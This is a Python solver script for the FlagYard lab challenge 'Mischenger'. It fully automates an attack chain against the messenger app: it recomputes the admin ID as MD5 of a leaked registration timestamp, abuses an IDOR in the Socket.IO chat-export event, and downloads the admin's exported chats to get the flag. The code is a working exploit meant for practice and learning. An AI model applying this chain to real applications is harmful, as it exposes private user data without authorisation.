#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MISCHENGER  -  FlagYard Web solver

Mischenger (FlagYard Training Labs, Medium) is a Socket.IO messenging app.
The chain:

    * user_id derivation   -- /api/auth/register answers with a JWT whose
      payload is {"user_id": <32 hex>, "exp": ...}. user_id is NOT random:
      it is the MD5 of the user's registration timestamp:
          user_id = md5("YYYY-MM-DD HH:MM:SS")
      (the second of the server Date header when the account is created).

    * admin_id recovery    -- GET /api/users/stats (token required) leaks the
      registration times of every user. The seeded admin row is:
          "2024-01-01 08:00:00"
      so admin_id = md5("2024-01-01 08:00:00")
                   = 34fe3e505a9472469cbcc0bfa19103bd
      (verified: our own user_id matches md5 of our own registration second).

    * export IDOR          -- the "Export" feature runs over Socket.IO: the
      client emits `export_chats` with {user_id, export_type}. The server
      NEVER enforces that user_id belongs to the socket's owner; it blindly
      exports every chat of the target user, and it authenticates the socket
      through the Flask session cookie. Passing the admin user_id exports the
      admin's private "Admin Private Notes" chat (403 otherwise).

    * flag leak            -- a CSV export is generated server-side
      (chat_export_admin.csv) and is listed in GET /api/exports for ANY
      authenticated user. GET /api/download/<export_id> fetches it, and the
      admin's chat contains:
          ??? FLAG: FlagY{...}

Verified: the tool extracts the live flag and saves flag_from_mischenger.txt.
Solver: http.client for REST + python-socketio for the Socket.IO export event
(optionally with the manual raw Socket.IO client - see the writeup).
"""
from __future__ import annotations

import base64
import hashlib
import json
import random
import re
import sys
import time
import http.client
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("M I S C H E N G E R   S O L V E R",
              "md5(reg time) user_id | export IDOR | chat leak"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Mischenger challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url

def http_raw(host, path, method="GET", body=None, token=None, cookie=None,
             ctype="application/json"):
    c = http.client.HTTPConnection(host, 80, timeout=30)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        b = json.dumps(body).encode()
        headers["Content-Length"] = str(len(b))
    else:
        b = None
    if token:
        headers["Authorization"] = "Bearer " + token
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=b, headers=headers)
    r = c.getresponse()
    content = r.read()
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    try:
        data = json.loads(content.decode("utf-8", "replace"))
    except Exception:
        data = content
    return r.status, hdrs, data

def b64url_decode(s):
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)

def jwt_payload(token):
    return json.loads(b64url_decode(token.split(".")[1]))

def md5_ts(ts):
    return hashlib.md5(ts.encode()).hexdigest()

# ---------------------------------------------------------------------------
# Mischenger specifics
# ---------------------------------------------------------------------------
FLAG_RE = re.compile(r"FlagY\{[^}]+\}")

def register(host):
    base = "x%d" % random.randint(10000000, 99999999)
    body = {"username": base, "email": base + "@x.com",
            "displayName": base, "password": "Passw0rd!"}
    st, h, o = http_raw(host, "/api/auth/register", "POST", body=body)
    if st != 201 or not isinstance(o, dict):
        raise RuntimeError("register failed: %r" % o)
    user_id = jwt_payload(o.get("token", "")).get("user_id")
    return base, user_id, h.get("date", "")

def login(host, username):
    body = {"username": username, "password": "Passw0rd!"}
    st, h, o = http_raw(host, "/api/auth/login", "POST", body=body)
    if st != 200 or not isinstance(o, dict):
        raise RuntimeError("login failed: %r" % o)
    cookie = None
    m = re.search(r"(session=[^;]+)", h.get("set-cookie", ""))
    if m:
        cookie = m.group(1)
    return o.get("token"), cookie

def admin_first_registration(host, token):
    st, h, o = http_raw(host, "/api/users/stats", token=token)
    if st != 200 or not isinstance(o, dict) or "stats" not in o:
        raise RuntimeError("stats failed: %r" % o)
    first = None
    for s in o["stats"]:
        fr = s.get("first_registration")
        if fr and (first is None or fr < first):
            first = fr
    if not first:
        raise RuntimeError("no seeded registration found")
    return first

def export_admin_chats(host, cookie, admin_id):
    try:
        import socketio as _sio
    except ImportError:
        raise RuntimeError("python-socketio is required: `pip install python-socketio`")
    result = {}
    sio = _sio.Client(reconnection=False)
    sio.on("export_completed", lambda d: result.update(completed=d, done=True))
    sio.on("export_error", lambda d: result.update(error=d, done=True))
    sio.connect("http://%s" % host, transports=["polling"], wait_timeout=15,
                headers={"Cookie": cookie})
    sio.emit("export_chats", {"user_id": admin_id, "export_type": "all"})
    deadline = time.time() + 60
    while time.time() < deadline and not result.get("done"):
        time.sleep(0.4)
    try:
        sio.disconnect()
    except Exception:
        pass
    if "error" in result:
        raise RuntimeError("export_error: %r" % result["error"])
    if "completed" not in result:
        raise RuntimeError("no export_completed within timeout")
    data = result["completed"]
    return data.get("filename") if isinstance(data, dict) else None

def download_flag(host, token, filename):
    st, h, o = http_raw(host, "/api/exports", token=token)
    if st != 200 or not isinstance(o, dict):
        raise RuntimeError("exports list failed")
    target = None
    for e in o.get("exports", []):
        if e.get("filename") == filename:
            target = e.get("id")
            break
    if not target:
        raise RuntimeError("admin export not listed in /api/exports")
    st, h, b = http_raw(host, "/api/download/" + str(target), token=token)
    if st != 200:
        raise RuntimeError("download failed: HTTP %d" % st)
    text = b.decode("utf-8", "replace") if isinstance(b, bytes) else str(b)
    m = FLAG_RE.search(text)
    if not m:
        raise RuntimeError("flag not found in export body")
    return m.group(0)

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.08, "target host %s" % host)

    uname, uid, date_h = register(host)
    ok(0.20, "registered %s, user_id %s..." % (uname, uid[:16]))
    status(0.28, "user_id == md5('YYYY-MM-DD HH:MM:SS') of the registration second")

    token, cookie = login(host, uname)
    ok(0.42, "login ok (%s), session cookie captured" % uname)

    first = admin_first_registration(host, token)
    ok(0.54, "admin seeded at %s" % first)
    admin_id = md5_ts(first)
    ok(0.64, "admin_id = md5(%s) = %s" % (first, admin_id))

    status(0.74, "socket export: export_chats on user_id=%s (IDOR)" % admin_id)
    filename = export_admin_chats(host, cookie, admin_id)
    ok(0.84, "export_completed -> %s" % filename)

    flag = download_flag(host, token, filename)
    ok(0.94, "admin chat export downloaded, FLAG in messages: %s" % flag)

    big_flag(flag, time.time() - t0, "md5(reg time) user_id | socket export IDOR")
    outp = Path(__file__).resolve().parent / "flag_from_mischenger.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()